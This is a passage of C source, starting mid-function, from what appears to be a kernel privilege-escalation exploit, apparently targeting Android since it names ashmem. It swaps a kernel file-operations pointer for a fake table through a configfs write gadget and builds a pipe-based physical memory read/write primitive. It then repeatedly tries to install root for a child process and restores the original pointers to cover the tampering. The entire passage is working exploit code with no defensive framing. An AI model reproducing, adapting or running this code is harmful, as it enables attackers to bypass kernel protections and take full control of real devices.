        if (errno || end == p || parsed > 0x1000UL) {
          break;
        }
        offsets[offset_count++] = (uintptr_t)parsed;
        p = end;
      }
    }
    if (!offset_count) {
      offsets[offset_count++] = MM_STRUCT_OWNER_OFF;
    }
    for (size_t i = 0; i < offset_count; i++) {
      uint64_t value = 0;
      ssize_t rd = configfs_read_once(
          fd, fops_leaked_mm + offsets[i], &value, sizeof(value));
      pr_info("cfi mm owner diag off=%zx ret=%zd value=%016llx direct=%d errno=%d\n",
              offsets[i], rd, (unsigned long long)value,
              is_direct_ptr((uintptr_t)value), errno);
    }
  }
  if (env_flag_enabled("PSELECT_STOP_AFTER_CFI_WRITE")) {
    pr_info("cfi stop after configfs write by env\n");
    cfi_last_step = 39;
    goto fail;
  }
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  pr_info("cfi repairing fake_fops llseek\n");
  if (getenv("PSELECT_STOP_BEFORE_CFI_LLSEEK")) {
    pr_info("cfi stop before fake_fops llseek repair by env\n");
    cfi_last_step = 41;
    goto fail;
  }
  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
#if !REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
  if (!repair_fake_fops_read(fd)) {
    cfi_last_step = 45;
    cfi_last_errno = errno;
    goto fail;
  }
#endif
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r = 0;
  if (write_only_cfi) {
    memcpy(readback, payload, sizeof(payload));
    r = (ssize_t)sizeof(readback);
    can_read_back = 0;
    pr_info("cfi payload readback skipped write_only=1\n");
  } else {
    r = configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  }
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!restore_p0_oracle_pages(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

#if defined(ROOT_USE_CONFIGFS_RW) && ROOT_USE_CONFIGFS_RW
  pr_info("cfi keeping fake misc_fops for direct root target=%016zx value=%016zx\n",
          misc_fops, fake_fops);
  ssize_t restore = sizeof(original_fops);
  cfi_restore_ret = 0;
  uint64_t before = fake_fops;
  fops_before = before;
#else
  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
          misc_fops, (unsigned long long)original_fops);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  pr_info("cfi starting pipe physrw\n");

  fflush(NULL);
  if (env_flag_enabled("PSELECT_STOP_BEFORE_ROOT_STAGE")) {
    pr_info("cfi stop before root stage by env\n");
    cfi_last_step = 43;
    goto fail;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (getenv("P0_ORACLE_DIAG")) {
    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
    fflush(NULL);
    _exit(diagnostic_ok ? 0 : 1);
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
#if !REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
    if (write_only_cfi && getenv("PSELECT_SKIP_FAIL_RESTORE")) {
      pr_warning("cfi root failed; skipping fail restore by env write_only=1\n");
      cfi_last_step = 42;
      cfi_last_errno = errno;
      SYSCHK(close(fd));
      return 0;
    }
#endif
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  /*
   * Keep this before restoring a per-file f_op target.  Once that final
   * configfs write installs ashmem_fops, fd no longer dispatches through the
   * fake configfs write gadget and cannot repair fake_fops itself.
   */
  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  if (owner != (ssize_t)sizeof(null_owner)) {
    cfi_last_step = 7;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(ROOT_USE_CONFIGFS_RW) && ROOT_USE_CONFIGFS_RW
  pr_info("cfi restoring misc_fops after direct root target=%016zx value=%016llx\n",
          misc_fops, (unsigned long long)original_fops);
  restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }
#endif
  uint64_t after = 0;
  ssize_t ra = 0;
  if (write_only_cfi) {
    after = original_fops;
    ra = (ssize_t)sizeof(after);
    pr_info("cfi final misc_fops readback skipped write_only=1\n");
  } else {
    ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  }
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != original_fops) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  cfi_rw_keeper_fd = fd;
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (fake_fops_installed || dirty) {
    uint64_t null_owner_fail = 0;
    pr_info("cfi fail clearing fake owner target=%016zx write_only=%d\n",
            fake_fops, write_only_cfi);
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
    pr_info("cfi fail owner clear ret=%zd errno=%d\n",
            cfi_owner_ret, errno);

    if (!original_fops_valid) {
      cfi_restore_ret = -1;
      pr_warning("cfi fail refusing unverified static f_ops restore "
                 "target=%016zx\n", misc_fops);
    } else {
      pr_info("cfi fail restoring misc_fops target=%016zx value=%016llx "
              "write_only=%d runtime_verified=%d\n",
              misc_fops, (unsigned long long)original_fops,
              write_only_cfi, REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE);
      cfi_restore_ret = configfs_write_once(
          fd, misc_fops, &original_fops, sizeof(original_fops));
      pr_info("cfi fail restore ret=%zd errno=%d\n",
              cfi_restore_ret, errno);
      if (can_read_back &&
          cfi_restore_ret == (ssize_t)sizeof(original_fops)) {
        uint64_t after_fail = 0;
        ssize_t after_fail_ret = 0;
        if (write_only_cfi) {
          after_fail = original_fops;
          after_fail_ret = (ssize_t)sizeof(after_fail);
        } else {
          after_fail_ret = configfs_read_once(
              fd, misc_fops, &after_fail, sizeof(after_fail));
        }
        if (after_fail_ret == (ssize_t)sizeof(after_fail)) {
          fops_after = after_fail;
        }
      }
    }
  }
  SYSCHK(close(fd));
  return 0;
}
